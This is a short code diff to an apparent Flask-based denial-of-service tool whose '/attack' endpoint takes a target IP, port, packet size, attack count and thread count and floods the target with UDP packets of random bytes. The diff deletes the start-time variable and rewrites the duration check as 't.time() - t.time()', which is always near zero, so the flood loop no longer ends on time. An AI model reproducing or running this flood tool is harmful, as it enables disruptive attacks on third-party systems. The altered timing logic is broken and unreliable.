@@ -10,7 +10,7 @@ app = Flask(__name__)
 @app.route('/attack', methods=['POST'])
 def start_attack():
     data = request.get_json()
-    start_time = t.time()
+    
     num_bytes = data.get('payload', 1024)
     num_attacks = data.get('attack_num', 100000)
     target_ip = data.get('ip', "0.0.0.0")
@@ -50,7 +50,7 @@ def start_attack():
         if remaining_bytes > 0:
             s.sendto(random._urandom(remaining_bytes), (target_ip, int(target_port)))
         s.close()
-    while t.time() - start_time < duration:
+    while t.time() - t.time() < duration:
         for _ in range(int(data.get('threads', 10))):
             for _ in range(int(num_attacks)):
                 attack()
